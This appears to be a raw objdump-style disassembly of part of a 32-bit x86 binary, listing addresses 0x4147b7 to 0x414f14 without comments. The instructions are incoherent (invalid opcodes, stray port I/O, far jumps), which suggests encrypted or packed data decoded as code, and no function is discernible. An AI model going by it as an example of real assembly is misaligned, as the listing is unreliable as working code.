  4147b7:	xchg   BYTE PTR [esi],bh
  4147b9:	adc    eax,0xf07cc0a5
  4147be:	jns    0x4147a4
  4147c0:	xchg   ebp,eax
  4147c1:	stc    
  4147c2:	shl    DWORD PTR [ebp+0x7c],1
  4147c5:	rol    DWORD PTR ds:0xd47a9dec,0x51
  4147cc:	data16 (bad) 
  4147ce:	in     al,dx
  4147cf:	sub    DWORD PTR ds:0x34d07e56,edx
  4147d5:	sub    al,0x58
  4147d7:	add    bh,bl
  4147d9:	or     BYTE PTR [ebx-0x6c],ah
  4147dc:	inc    edx
  4147dd:	aam    0xc8
  4147df:	mov    fs,esp
  4147e1:	and    al,0x51
  4147e3:	gs int3 
  4147e5:	shl    DWORD PTR [edi-0x5eaeba34],1
  4147eb:	shl    BYTE PTR [ecx+0x10],1
  4147ee:	outs   dx,BYTE PTR ds:[esi]
  4147ef:	pop    ss
  4147f0:	mov    DWORD PTR [esi+eax*1+0x66],0x3d082705
  4147f8:	add    DWORD PTR [ebx],eax
  4147fa:	aas    
  4147fb:	scas   al,BYTE PTR es:[edi]
  4147fc:	xchg   esi,eax
  4147fd:	ss cmp ebp,esi
  414800:	jle    0x414848
  414802:	stos   DWORD PTR es:[edi],eax
  414803:	stc    
  414804:	pop    es
  414805:	aas    
  414806:	mov    ds:0xc5c45922,eax
  41480b:	mov    ebp,DWORD PTR [eax]
  41480d:	push   ebx
  41480e:	inc    esi
  41480f:	stos   BYTE PTR es:[edi],al
  414810:	xor    BYTE PTR [ecx],0x32
  414813:	cmc    
  414814:	xchg   edx,eax
  414815:	jge    0x414815
  414817:	div    BYTE PTR [ecx+0x42]
  41481a:	(bad)  
  41481b:	test   BYTE PTR [ecx+0x5d],0x89
  41481f:	aaa    
  414820:	mov    eax,ds:0x5ca339d
  414825:	jecxz  0x414806
  414827:	adc    cl,BYTE PTR [esi+0x21]
  41482a:	push   esp
  41482b:	ins    BYTE PTR es:[edi],dx
  41482c:	in     eax,dx
  41482d:	lods   eax,DWORD PTR ds:[esi]
  41482e:	jb     0x414817
  414830:	pop    ss
  414831:	or     al,0x26
  414833:	out    0x7f,al
  414835:	push   eax
  414836:	jmp    0x457a:0xbf36ee11
  41483d:	push   ds
  41483e:	xor    BYTE PTR ds:0x988f2283,al
  414844:	in     eax,dx
  414845:	outs   dx,DWORD PTR ds:[esi]
  414846:	mov    al,ds:0xb55d26b6
  41484b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41484c:	or     BYTE PTR [ebx+esi*1-0x6eafd99f],ah
  414853:	xchg   esi,eax
  414854:	jp     0x414828
  414856:	repz inc edi
  414858:	into   
  414859:	or     ebp,edi
  41485b:	xchg   DWORD PTR [ecx+esi*1+0x62],ebx
  41485f:	fsub   st(0),st
  414861:	or     al,cl
  414863:	lods   al,BYTE PTR ds:[esi]
  414864:	popa   
  414865:	popf   
  414866:	jecxz  0x41486d
  414868:	lds    ebx,FWORD PTR [edi-0x49]
  41486b:	pop    esp
  41486c:	cld    
  41486d:	or     eax,0xb7a118ab
  414872:	inc    edi
  414873:	pop    ss
  414874:	inc    esp
  414875:	jle    0x414850
  414877:	mov    eax,0x85b68932
  41487c:	int    0x12
  41487e:	sar    BYTE PTR [esi+0x40ef621b],cl
  414884:	sbb    BYTE PTR [esi+0x74193902],bh
  41488a:	push   0xffffffb6
  41488c:	mov    dh,0x70
  41488e:	loopne 0x41484b
  414890:	ror    DWORD PTR [edx],1
  414892:	in     eax,dx
  414893:	jp     0x41484c
  414895:	sbb    ch,ch
  414897:	jge    0x414847
  414899:	push   es
  41489a:	xor    DWORD PTR [ecx-0x7c],edi
  41489d:	loope  0x41489d
  41489f:	sti    
  4148a0:	aaa    
  4148a1:	ret    0x7d3b
  4148a4:	push   esi
  4148a5:	dec    ecx
  4148a6:	push   ss
  4148a7:	xor    DWORD PTR [eax+0x7c9aa377],0xffffffa7
  4148ae:	or     eax,0xb37a701e
  4148b3:	not    BYTE PTR [edi]
  4148b5:	mov    ecx,0x789d37f4
  4148ba:	add    dh,dl
  4148bc:	xchg   esp,eax
  4148bd:	jnp    0x414936
  4148bf:	daa    
  4148c0:	ss cld 
  4148c2:	or     BYTE PTR [ebp-0xc7e7b8],bl
  4148c8:	mov    ch,0x2
  4148ca:	and    BYTE PTR [esp+edx*8-0x72],bl
  4148ce:	push   edx
  4148cf:	fwait
  4148d0:	mov    dh,0xeb
  4148d2:	std    
  4148d3:	fchs   
  4148d5:	jge    0x414875
  4148d7:	stos   DWORD PTR es:[edi],eax
  4148d8:	rol    BYTE PTR [ebp-0x80],1
  4148db:	fild   DWORD PTR [ebx+0x27a84ff]
  4148e1:	ret    
  4148e2:	div    DWORD PTR [ebx+0x0]
  4148e5:	aaa    
  4148e6:	stmxcsr DWORD PTR [esi+ebp*1]
  4148ea:	adc    eax,0xeda39e0f
  4148ef:	cmp    eax,0xe0ddf7d4
  4148f4:	or     DWORD PTR [ecx+0x70],eax
  4148f7:	lahf   
  4148f8:	arpl   WORD PTR [ecx-0x29],bp
  4148fb:	imul   eax,DWORD PTR [ebx],0xffffff99
  4148fe:	jmp    0x9dfc888d
  414903:	add    dl,BYTE PTR [ebp-0x36c9e5c4]
  414909:	gs pop esp
  41490b:	jns    0x4148d7
  41490d:	sbb    al,0xe5
  41490f:	call   0xad201c63
  414914:	out    0xa,al
  414916:	jmp    0x71b1:0xbccf0a03
  41491d:	in     al,dx
  41491e:	or     BYTE PTR [edi-0x7a],ch
  414921:	ret    
  414922:	out    dx,al
  414923:	push   ss
  414924:	ret    
  414925:	pop    edi
  414926:	sbb    DWORD PTR [ebx-0x73f8ab46],ebx
  41492c:	adc    BYTE PTR [edx],al
  41492e:	xchg   esi,eax
  41492f:	mov    bh,0xb6
  414931:	mov    fs,ecx
  414933:	aad    0x9e
  414935:	in     al,dx
  414936:	cmp    eax,0x25d8681d
  41493b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41493d:	push   es
  41493e:	jecxz  0x4148ef
  414940:	xor    BYTE PTR [ecx+0x79],bh
  414943:	jmp    0x4148de
  414945:	and    BYTE PTR [ebx-0x23341e88],dl
  41494b:	not    bl
  41494d:	loop   0x41496a
  41494f:	xor    BYTE PTR [esi-0x3e],cl
  414952:	fwait
  414953:	cs in  al,0xce
  414956:	lds    eax,FWORD PTR [ebp+0x2e]
  414959:	push   ecx
  41495a:	or     eax,0xda7530c2
  41495f:	push   eax
  414960:	pop    DWORD PTR [ecx+0x12763e47]
  414966:	in     al,dx
  414967:	dec    edx
  414968:	sbb    dl,bh
  41496a:	mov    DWORD PTR [edi-0x251c00b4],ecx
  414970:	(bad)  
  414971:	push   ecx
  414972:	inc    ebp
  414973:	sbb    ecx,DWORD PTR [edi+0x13362588]
  414979:	inc    esp
  41497a:	sbb    DWORD PTR [edi],edx
  41497c:	mov    ebx,0xed7825bc
  414981:	fs sti 
  414983:	daa    
  414984:	pop    ds
  414985:	imul   ebp,DWORD PTR [esi-0x3812f0dc]
  41498c:	enter  0x46a6,0x60
  414990:	mov    bl,bl
  414992:	push   es
  414993:	xor    al,0x50
  414995:	pop    ecx
  414996:	test   eax,0xbf58c8d
  41499b:	push   ebp
  41499c:	arpl   WORD PTR [eax+0x23],dx
  41499f:	mov    ch,0x98
  4149a1:	(bad)  
  4149a2:	cmp    ecx,DWORD PTR [esi]
  4149a4:	push   eax
  4149a5:	xchg   ebx,eax
  4149a6:	mov    al,0x1c
  4149a8:	fstp   QWORD PTR [ecx]
  4149aa:	ja     0x41498c
  4149ac:	pop    ebp
  4149ad:	sahf   
  4149ae:	xchg   ebx,eax
  4149af:	cld    
  4149b0:	retf   0xca49
  4149b3:	nop
  4149b4:	mov    es,WORD PTR [esi+ebx*4]
  4149b7:	aas    
  4149b8:	jnp    0x4149ac
  4149ba:	mov    BYTE PTR [ebx],dl
  4149bc:	scas   eax,DWORD PTR es:[edi]
  4149bd:	inc    esi
  4149be:	repnz lock mov edx,0x7c53e374
  4149c5:	dec    edx
  4149c6:	pop    eax
  4149c7:	and    ebx,eax
  4149c9:	test   eax,0xfd22d4fa
  4149ce:	mov    ebx,0xa7be0a31
  4149d3:	push   ss
  4149d4:	in     eax,dx
  4149d5:	sub    DWORD PTR [ecx+0x1a],esp
  4149d8:	push   ebp
  4149d9:	pop    es
  4149da:	shl    edi,cl
  4149dc:	cli    
  4149dd:	push   cs
  4149de:	aaa    
  4149df:	scas   al,BYTE PTR es:[edi]
  4149e0:	dec    esp
  4149e1:	cmp    DWORD PTR [ebp-0x57],eax
  4149e4:	popa   
  4149e5:	out    dx,al
  4149e6:	sbb    dh,dh
  4149e8:	add    eax,0xcf7e636b
  4149ed:	jae    0x4149c6
  4149ef:	push   eax
  4149f0:	test   DWORD PTR [esi-0x15],esi
  4149f3:	sahf   
  4149f4:	mov    al,ds:0xd9d61daa
  4149f9:	or     al,0x95
  4149fb:	mov    WORD PTR [ebx-0x6b79c79],es
  414a01:	cmc    
  414a02:	inc    edx
  414a03:	pop    esi
  414a04:	or     esi,eax
  414a06:	mov    cl,0x8
  414a08:	in     eax,dx
  414a09:	and    esi,DWORD PTR [eax+ecx*2+0x75b0be20]
  414a10:	inc    ebp
  414a11:	loopne 0x4149a1
  414a13:	in     al,dx
  414a14:	clc    
  414a15:	jmp    0x8b73:0x48bd8c85
  414a1c:	pop    eax
  414a1d:	cmp    dh,ch
  414a1f:	retf   0xa546
  414a22:	or     esp,edx
  414a24:	js     0x414a44
  414a26:	add    BYTE PTR [ebx-0x3fa8497],dl
  414a2c:	into   
  414a2d:	adc    eax,0xda33ce63
  414a32:	push   edx
  414a33:	sbb    dl,BYTE PTR [ecx+0x6e]
  414a36:	idiv   BYTE PTR [esi-0x32]
  414a39:	or     ch,dl
  414a3b:	les    ecx,FWORD PTR [edx]
  414a3d:	inc    edx
  414a3e:	pushf  
  414a3f:	test   eax,0x7d2e6c03
  414a44:	aam    0xb2
  414a46:	dec    esi
  414a47:	(bad)  
  414a48:	and    DWORD PTR [ebx-0x36d57726],esp
  414a4e:	and    al,BYTE PTR [esi+eax*4+0x59]
  414a52:	inc    ebx
  414a53:	aam    0xe7
  414a55:	(bad)  
  414a56:	repnz out dx,al
  414a58:	dec    eax
  414a59:	dec    edi
  414a5a:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  414a5c:	sub    ecx,ecx
  414a5e:	retf   0xc2
  414a61:	cld    
  414a62:	xchg   ecx,eax
  414a63:	and    bh,BYTE PTR [edi]
  414a65:	push   0xffffffaa
  414a67:	fidivr WORD PTR [ebx+0x37efac2a]
  414a6d:	mov    dl,BYTE PTR [esi]
  414a6f:	xchg   ecx,eax
  414a70:	cmp    ah,al
  414a72:	add    eax,0xcdaa9ff1
  414a77:	sub    bh,cl
  414a79:	pop    ss
  414a7a:	push   eax
  414a7b:	mov    DWORD PTR [edi+0x1b],0x52582851
  414a82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a83:	mov    ebp,0x5b46f548
  414a88:	xchg   DWORD PTR [ebp+0x10160eae],edx
  414a8e:	lock and DWORD PTR [edx],eax
  414a91:	push   0xc1dfbf0f
  414a96:	(bad)
  414a99:	retf   
  414a9a:	jno    0x414a40
  414a9c:	mov    bh,0x1c
  414a9e:	fstp   DWORD PTR [esp+edx*8-0x231c74c4]
  414aa5:	ja     0x414ace
  414aa7:	jmp    0x8df9d8c1
  414aac:	cmp    edi,DWORD PTR [edi+0x15d7ba8]
  414ab2:	sub    al,0x9a
  414ab4:	cdq    
  414ab5:	pop    esi
  414ab6:	out    0x43,al
  414ab8:	add    edx,DWORD PTR [edx]
  414aba:	fild   DWORD PTR [eax-0x20]
  414abd:	mov    ah,0x6e
  414abf:	adc    DWORD PTR [esi+0x4f],0xbef55e2f
  414ac6:	ss (bad) 
  414ac8:	in     al,dx
  414ac9:	loop   0x414a4b
  414acb:	push   cs
  414acc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414acd:	out    dx,eax
  414ace:	popa   
  414acf:	stos   DWORD PTR es:[edi],eax
  414ad0:	cmp    DWORD PTR ds:0xd3234c1a,0x16
  414ad7:	mov    ah,0xe2
  414ad9:	cmp    DWORD PTR [edx+0x56],ecx
  414adc:	cmp    BYTE PTR [ebp+0x1f20e32c],ah
  414ae2:	dec    edi
  414ae3:	ficomp DWORD PTR [ebx+0x51]
  414ae6:	or     bh,BYTE PTR [ebx]
  414ae8:	sub    esp,DWORD PTR [edx-0x6fb77ab5]
  414aee:	cdq    
  414aef:	dec    esp
  414af0:	sti    
  414af1:	loop   0x414ab3
  414af3:	clc    
  414af4:	push   ebp
  414af5:	repz jne 0x414b0a
  414af8:	add    edi,DWORD PTR [ebp-0x1f]
  414afb:	cmp    ah,BYTE PTR [esi+0x3f]
  414afe:	div    DWORD PTR es:[eax+0x52]
  414b02:	inc    ecx
  414b03:	cdq    
  414b04:	fdivr  st,st(4)
  414b06:	pop    esp
  414b07:	dec    eax
  414b08:	out    0xa,al
  414b0a:	ror    dl,cl
  414b0c:	loopne 0x414ac5
  414b0e:	sub    eax,0x7f5b3611
  414b13:	test   ebx,ebp
  414b15:	fsubr  QWORD PTR [edx]
  414b17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b18:	pusha  
  414b19:	xchg   ebx,eax
  414b1a:	xor    ebp,ebx
  414b1c:	pusha  
  414b1d:	ds hlt 
  414b1f:	retf   
  414b20:	inc    ebp
  414b21:	xlat   BYTE PTR ds:[ebx]
  414b22:	and    edx,DWORD PTR [eax]
  414b24:	dec    edx
  414b25:	and    al,0x2b
  414b27:	not    ch
  414b29:	pop    esp
  414b2a:	mov    ch,0xe7
  414b2c:	aad    0xa
  414b2e:	jo     0x414b8e
  414b30:	test   al,0xf0
  414b32:	push   0x917b14e0
  414b37:	mov    ah,0x17
  414b39:	pop    eax
  414b3a:	jb     0x414b3c
  414b3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b3d:	clc    
  414b3e:	jns    0x414b65
  414b40:	adc    BYTE PTR [edi],cl
  414b42:	pop    ecx
  414b43:	xchg   ecx,eax
  414b44:	cmp    esi,ecx
  414b46:	xor    DWORD PTR [eax-0x7268c46e],edi
  414b4c:	mov    bh,0x35
  414b4e:	fisubr WORD PTR [ebp+0x6d]
  414b51:	and    ah,BYTE PTR [edx]
  414b53:	mov    bh,0xd
  414b55:	dec    ebp
  414b56:	(bad)  
  414b57:	push   cs
  414b58:	or     al,0x32
  414b5a:	and    esi,0x61
  414b5d:	jae    0x414b83
  414b5f:	add    al,dl
  414b61:	cmp    BYTE PTR [ebx],0x13
  414b64:	scas   eax,DWORD PTR es:[edi]
  414b65:	sbb    eax,0x41dd1adb
  414b6a:	inc    eax
  414b6b:	enter  0x57c6,0xca
  414b6f:	jno    0x414ba2
  414b71:	sbb    BYTE PTR [eax],ch
  414b73:	sti    
  414b74:	fsubr  QWORD PTR [edx+ebx*2-0x5870410c]
  414b7b:	jo     0x414b1e
  414b7d:	jecxz  0x414b7d
  414b7f:	mov    ds:0x40260761,al
  414b84:	xchg   BYTE PTR [edi-0x55],bl
  414b87:	jnp    0x414b57
  414b89:	cmp    esp,ebx
  414b8b:	jle    0x414b26
  414b8d:	pop    es
  414b8e:	in     eax,0xa1
  414b90:	inc    ecx
  414b91:	and    esi,edx
  414b93:	push   cs
  414b94:	fst    DWORD PTR [ebx-0x6367dd4]
  414b9a:	adc    eax,0x66726ff8
  414b9f:	dec    ebx
  414ba0:	fdivr  QWORD PTR [ecx-0xf]
  414ba3:	push   esi
  414ba4:	jae    0x414c04
  414ba6:	iret   
  414ba7:	dec    eax
  414ba8:	aas    
  414ba9:	retf   
  414baa:	aam    0xb6
  414bac:	add    DWORD PTR [eax+0x27],ebx
  414baf:	sub    bh,bh
  414bb1:	dec    esi
  414bb2:	xor    DWORD PTR [eax+edx*2],eax
  414bb5:	stos   BYTE PTR es:[edi],al
  414bb6:	sbb    eax,0x900b4b8b
  414bbb:	fnstcw WORD PTR [ecx]
  414bbd:	leave  
  414bbe:	stc    
  414bbf:	mov    esi,0xc3c24b7d
  414bc4:	or     DWORD PTR [edi],ebp
  414bc6:	mov    eax,0xbaa67381
  414bcb:	stos   BYTE PTR es:[edi],al
  414bcc:	bound  esp,QWORD PTR [ecx+eiz*8]
  414bcf:	outs   dx,BYTE PTR ds:[esi]
  414bd0:	ins    BYTE PTR es:[edi],dx
  414bd1:	mov    ebx,0xa0afc498
  414bd6:	ficomp DWORD PTR [ebp-0x4d7852b2]
  414bdc:	jmp    0x99dd5538
  414be1:	stos   BYTE PTR es:[edi],al
  414be2:	in     eax,dx
  414be3:	jns    0x414b7c
  414be5:	xor    bl,0x21
  414be8:	jno    0x414bb8
  414bea:	ins    BYTE PTR es:[edi],dx
  414beb:	outs   dx,BYTE PTR ds:[esi]
  414bec:	fimul  WORD PTR [edi-0x4028a5c1]
  414bf2:	push   esp
  414bf3:	dec    esp
  414bf4:	mov    dh,0x3d
  414bf6:	xor    BYTE PTR ds:0x1434ad37,ch
  414bfc:	or     al,BYTE PTR [edi]
  414bfe:	ja     0x414bdf
  414c00:	push   edi
  414c01:	lods   al,BYTE PTR ds:[esi]
  414c02:	xor    al,0xcd
  414c04:	out    0xf9,eax
  414c06:	gs pop edi
  414c08:	sbb    DWORD PTR [ebx+ebp*8+0xb],eax
  414c0c:	and    DWORD PTR [ebx+0x7e],edx
  414c0f:	jl     0x414c48
  414c11:	jle    0x414bcd
  414c13:	(bad)  
  414c14:	iret   
  414c15:	test   eax,0xea536b2b
  414c1a:	repz pop edi
  414c1c:	retf   
  414c1d:	pop    edx
  414c1e:	into   
  414c1f:	add    ebp,DWORD PTR [ecx+0x7c]
  414c22:	loope  0x414be0
  414c24:	jae    0x414c77
  414c26:	and    al,0x34
  414c28:	stos   BYTE PTR es:[edi],al
  414c29:	mov    eax,0xf9295cdf
  414c2e:	nop
  414c2f:	repnz and bl,bl
  414c32:	sbb    al,0x19
  414c34:	inc    edx
  414c35:	pop    DWORD PTR [ecx]
  414c37:	nop
  414c38:	mov    eax,?
  414c3a:	popf   
  414c3b:	lock or al,BYTE PTR [edi-0x43567d7e]
  414c42:	jnp    0x414cb1
  414c44:	int3   
  414c45:	dec    eax
  414c46:	push   di
  414c48:	sbb    DWORD PTR [edi-0x4c],0xf
  414c4c:	cmp    al,0x6f
  414c4e:	repnz arpl WORD PTR [ecx-0xe1d6ea5],si
  414c55:	ds push esp
  414c57:	cs fadd st,st(3)
  414c5a:	ins    DWORD PTR es:[edi],dx
  414c5b:	shr    edi,1
  414c5d:	sbb    bh,BYTE PTR [edi]
  414c5f:	sbb    edi,DWORD PTR [eax]
  414c61:	lods   al,BYTE PTR ds:[esi]
  414c62:	ret    
  414c63:	and    BYTE PTR [edi],ch
  414c65:	xchg   ecx,eax
  414c66:	mov    ds:0x6a0ad8ed,eax
  414c6b:	(bad)  
  414c6c:	cld    
  414c6d:	pop    edi
  414c6e:	push   esp
  414c6f:	jecxz  0x414c6b
  414c71:	cmc    
  414c72:	pop    ebx
  414c73:	scas   al,BYTE PTR es:[edi]
  414c74:	mov    edx,0x7afccd59
  414c79:	gs or  eax,0x3bf31be
  414c7f:	rcr    DWORD PTR [ebp+0x59],0xf7
  414c83:	pop    esi
  414c84:	call   0x7a392472
  414c89:	adc    cl,BYTE PTR [ebx-0x3170fe13]
  414c8f:	jno    0x414cb8
  414c91:	call   0x3da2fc65
  414c96:	pop    eax
  414c97:	int    0xed
  414c99:	push   esp
  414c9a:	ds sub al,0x9b
  414c9d:	and    cl,cl
  414c9f:	int3   
  414ca0:	cmp    DWORD PTR [edi],esp
  414ca2:	hlt    
  414ca3:	pop    esp
  414ca4:	xchg   ecx,eax
  414ca5:	sub    BYTE PTR [ebx+0xb],bl
  414ca8:	xchg   ecx,eax
  414ca9:	fucom  st(0)
  414cab:	jge    0x414c82
  414cad:	repnz mov esp,0x8f166e40
  414cb3:	pop    ss
  414cb4:	push   es
  414cb5:	repnz sub al,0x9
  414cb8:	xchg   ecx,eax
  414cb9:	retf   0xf42a
  414cbc:	pop    edx
  414cbd:	ror    BYTE PTR [esi+ebx*8],0xfe
  414cc1:	inc    ecx
  414cc2:	iret   
  414cc3:	jo     0x414c8a
  414cc5:	cmp    eax,0x73ca22eb
  414cca:	aam    0x21
  414ccc:	push   edx
  414ccd:	int3   
  414cce:	cmp    ah,BYTE PTR [esi-0xe559e1d]
  414cd4:	cmc    
  414cd5:	mov    dl,0x4f
  414cd7:	xor    edx,DWORD PTR [edi]
  414cd9:	inc    ebx
  414cda:	push   0x5fa5beed
  414cdf:	out    dx,eax
  414ce0:	into   
  414ce1:	retf   0x8baa
  414ce4:	jmp    0x36b9:0x547d9ad8
  414ceb:	dec    ebx
  414cec:	jecxz  0x414c7e
  414cee:	cdq    
  414cef:	out    dx,eax
  414cf0:	push   edi
  414cf1:	repz pushf 
  414cf3:	outs   dx,DWORD PTR ds:[esi]
  414cf4:	in     eax,dx
  414cf5:	xor    esi,DWORD PTR [ebx-0x18]
  414cf8:	fld    DWORD PTR [edi+eiz*1+0x1df22902]
  414cff:	sbb    dl,cl
  414d01:	jno    0x414d59
  414d03:	push   0xfffffff2
  414d05:	leave  
  414d06:	pop    ecx
  414d07:	fnsave [edi]
  414d09:	out    0x6f,al
  414d0b:	out    0x41,al
  414d0d:	fcom   st(4)
  414d0f:	jno    0x414d24
  414d11:	jnp    0x414cdf
  414d13:	cdq    
  414d14:	push   edi
  414d16:	or     DWORD PTR [eax],ebx
  414d18:	push   ebx
  414d19:	cmp    edi,DWORD PTR [ecx+esi*8-0x1e321940]
  414d20:	push   esp
  414d21:	and    bh,BYTE PTR [ecx]
  414d23:	inc    ecx
  414d24:	(bad)  
  414d25:	repnz loop 0x414d9e
  414d28:	pop    esi
  414d29:	push   0xec4dfeea
  414d2e:	ins    BYTE PTR es:[edi],dx
  414d2f:	add    DWORD PTR [eax+0x40],ebx
  414d32:	fs cmp al,0x8c
  414d35:	test   ebp,edi
  414d37:	cmp    ecx,DWORD PTR [edx]
  414d39:	stos   BYTE PTR es:[edi],al
  414d3a:	mov    ebp,0x36f422b0
  414d3f:	or     BYTE PTR [esi+0xdf2159e],0x35
  414d46:	xchg   edi,eax
  414d47:	lock sub dh,BYTE PTR [eax+0xf24452a]
  414d4e:	sub    eax,0x9abf0601
  414d53:	jbe    0x414d4a
  414d55:	jb     0x414da7
  414d57:	xor    ecx,DWORD PTR [esi-0x59]
  414d5a:	(bad)  
  414d5b:	fwait
  414d5c:	rcr    DWORD PTR [edi-0x7c4eb2b8],0xdb
  414d63:	dec    esp
  414d64:	into   
  414d65:	fidiv  WORD PTR [edi]
  414d67:	rol    BYTE PTR [ebx+0x75],0x42
  414d6b:	mov    ebp,?
  414d6d:	xor    eax,0x7f609f53
  414d72:	xchg   edi,eax
  414d73:	ds dec edi
  414d75:	out    0x77,al
  414d77:	sbb    DWORD PTR [ebp+0x50],ebp
  414d7a:	shl    BYTE PTR [eax-0x2e],0x33
  414d7e:	cs repnz (bad) 
  414d81:	fbstp  TBYTE PTR [edx-0xf]
  414d84:	outs   dx,DWORD PTR ds:[esi]
  414d85:	xor    al,0xd8
  414d87:	aad    0x9b
  414d89:	xchg   edi,eax
  414d8a:	pop    edx
  414d8b:	jmp    0x414dc2
  414d8d:	pusha  
  414d8e:	push   esi
  414d8f:	ja     0x414d59
  414d91:	ror    ah,0xd
  414d94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d95:	dec    ecx
  414d96:	mov    eax,0xd0a633a
  414d9b:	outs   dx,DWORD PTR cs:[esi]
  414d9d:	in     al,0xdd
  414d9f:	add    eax,0x96c86a1c
  414da4:	xchg   esp,eax
  414da5:	mov    ecx,0xd3fa8eaa
  414daa:	xchg   DWORD PTR [ebx+0x32],edx
  414dad:	mov    eax,ds:0x133fc0c3
  414db2:	sbb    edx,DWORD PTR [ebx+edx*2+0x9]
  414db6:	jge    0x414d6d
  414db8:	mov    WORD PTR [ebx+0x467c34b0],ds
  414dbe:	push   eax
  414dbf:	or     ah,bh
  414dc1:	push   ds
  414dc2:	mov    ebp,0x6a9316f9
  414dc7:	mov    bl,bl
  414dc9:	sbb    esi,edi
  414dcb:	pop    edi
  414dcc:	mov    ecx,0x65d59fbb
  414dd1:	icebp  
  414dd2:	jne    0x414e07
  414dd4:	sbb    ch,dh
  414dd6:	mov    ah,dh
  414dd8:	jb     0x414d8b
  414dda:	sti    
  414ddb:	scas   al,BYTE PTR es:[edi]
  414ddc:	or     ecx,DWORD PTR [ebx-0x19]
  414ddf:	xor    eax,0x85b0d83f
  414de4:	outs   dx,DWORD PTR ds:[esi]
  414de5:	das    
  414de6:	fistp  DWORD PTR [ebx+0x35]
  414de9:	js     0x414dff
  414deb:	pop    ebx
  414dec:	or     bl,bh
  414dee:	mov    ah,0x8d
  414df0:	out    dx,eax
  414df1:	cli    
  414df2:	xchg   esi,eax
  414df3:	pop    ss
  414df4:	stos   BYTE PTR es:[edi],al
  414df5:	xor    DWORD PTR [ecx],0xd95e9a1f
  414dfb:	cs dec eax
  414dfd:	or     bh,BYTE PTR [esi+0x1]
  414e00:	pusha  
  414e01:	loope  0x414daa
  414e03:	add    eax,0xd33c2d06
  414e08:	mov    bh,0x6b
  414e0a:	cdq    
  414e0b:	mov    dh,BYTE PTR [esi+0x4c]
  414e0e:	or     bl,BYTE PTR [edx]
  414e10:	in     eax,dx
  414e11:	out    dx,eax
  414e12:	pop    eax
  414e13:	jl     0x414ddc
  414e15:	xor    ebx,DWORD PTR [ebp-0x41]
  414e18:	push   cs
  414e19:	adc    eax,0x9ac954c9
  414e1e:	pop    ecx
  414e1f:	or     BYTE PTR [edx+0x52637c1c],dl
  414e25:	xor    esi,DWORD PTR [edi]
  414e27:	jmp    0x28dbb10d
  414e2c:	retf   
  414e2d:	(bad)  
  414e2e:	inc    BYTE PTR [ebx-0x52]
  414e31:	sbb    eax,0x837b77b2
  414e36:	push   es
  414e37:	pop    esi
  414e38:	sub    BYTE PTR [eax-0xe5840b6],ah
  414e3e:	jg     0x414deb
  414e40:	arpl   WORD PTR [edi+0x6499723e],bp
  414e46:	test   eax,0xb8ddf13e
  414e4b:	sub    BYTE PTR [ecx+0x4a],bl
  414e4e:	inc    edx
  414e4f:	cmp    al,0x60
  414e51:	data16 je 0x414e3f
  414e54:	fxch   st(4)
  414e56:	sub    BYTE PTR [edi-0x5c],dl
  414e59:	lods   al,BYTE PTR ds:[esi]
  414e5a:	enter  0x930f,0x14
  414e5e:	retf   
  414e5f:	and    DWORD PTR [ecx],esi
  414e61:	scas   eax,DWORD PTR es:[edi]
  414e62:	jg     0x414e2b
  414e64:	cli    
  414e65:	nop
  414e66:	dec    esi
  414e67:	push   ebp
  414e68:	and    al,0xaf
  414e6a:	or     cl,BYTE PTR [ebx-0x438ef70e]
  414e70:	or     al,0x1c
  414e72:	xchg   ebp,eax
  414e73:	cli    
  414e74:	in     al,dx
  414e75:	or     DWORD PTR [edx+edx*4+0x33],ebx
  414e79:	lea    edi,[edx]
  414e7b:	cmp    DWORD PTR [eax+0x78],0xffffff80
  414e7f:	aam    0xfa
  414e81:	jb     0x414e8f
  414e83:	xor    DWORD PTR [ebx-0x3f],0x85142b97
  414e8a:	or     dh,BYTE PTR [esi-0x604f1f5d]
  414e90:	sti    
  414e91:	(bad)  
  414e92:	jns    0x414e8a
  414e94:	xlat   BYTE PTR ds:[ebx]
  414e95:	ss (bad) 
  414e97:	xor    edi,ecx
  414e99:	mov    eax,0x3eced83b
  414e9e:	dec    eax
  414e9f:	shr    ch,1
  414ea1:	call   0xc420f9d5
  414ea6:	ret    0xa26f
  414ea9:	ds sti 
  414eab:	mov    dl,0x18
  414ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414eae:	test   ch,cl
  414eb0:	inc    ebp
  414eb1:	lahf   
  414eb2:	adc    esi,DWORD PTR [ebx+0x45]
  414eb5:	mov    ah,0xc3
  414eb7:	xor    ebx,DWORD PTR [edi-0x7c]
  414eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ebb:	pop    es
  414ebc:	int3   
  414ebd:	sub    BYTE PTR ds:0x2260dbda,al
  414ec3:	fld    QWORD PTR [edi-0x45]
  414ec6:	push   ebx
  414ec7:	test   DWORD PTR [eax+0x61],ecx
  414eca:	mov    bh,0xd8
  414ecc:	pushf  
  414ecd:	and    BYTE PTR [eax],ch
  414ecf:	pop    edi
  414ed0:	out    dx,eax
  414ed1:	out    dx,eax
  414ed2:	xor    edx,DWORD PTR [edx+edi*4+0x7a]
  414ed6:	loopne 0x414ecc
  414ed8:	pop    edi
  414ed9:	pusha  
  414eda:	xor    DWORD PTR [esi+0x3d172209],ebx
  414ee0:	lods   al,BYTE PTR ds:[esi]
  414ee1:	addr16 xchg esi,eax
  414ee3:	out    dx,al
  414ee4:	sub    ecx,ebx
  414ee6:	pop    ebp
  414ee7:	popa   
  414ee8:	dec    ebp
  414ee9:	sub    al,0x13
  414eeb:	push   ebp
  414eec:	pusha  
  414eed:	jle    0x414e99
  414eef:	sahf   
  414ef0:	ret    
  414ef1:	jmp    0x870be1fa
  414ef6:	sbb    DWORD PTR [eax-0x43b13d83],esi
  414efc:	or     BYTE PTR [ebp+0x128a8f02],ch
  414f02:	sti    
  414f03:	and    bl,BYTE PTR [edx]
  414f05:	loop   0x414f12
  414f07:	pop    esp
  414f08:	or     dl,BYTE PTR [eax+esi*8]
  414f0b:	push   esi
  414f0c:	retf   0xe8d0
  414f0f:	ins    DWORD PTR es:[edi],dx
  414f10:	test   al,0xac
  414f12:	sub    al,0x78
  414f14:	mov    esp,0x67211bb8
